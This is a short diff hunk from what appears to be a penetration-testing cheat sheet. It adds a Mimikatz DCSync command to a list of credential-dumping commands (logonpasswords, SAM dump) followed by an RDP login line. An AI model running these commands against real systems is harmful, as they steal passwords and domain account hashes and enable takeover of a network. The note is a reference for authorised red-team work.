@@ -225,6 +225,7 @@ privilege::debug
 token::elevate
 sekurlsa::logonpasswords
 lsadump::sam
+lsadump::dcsync /domain: /all
 
 * Run this for RDP :
 xfreerdp /u:uname /p:pass /cert:ignore /v:ip
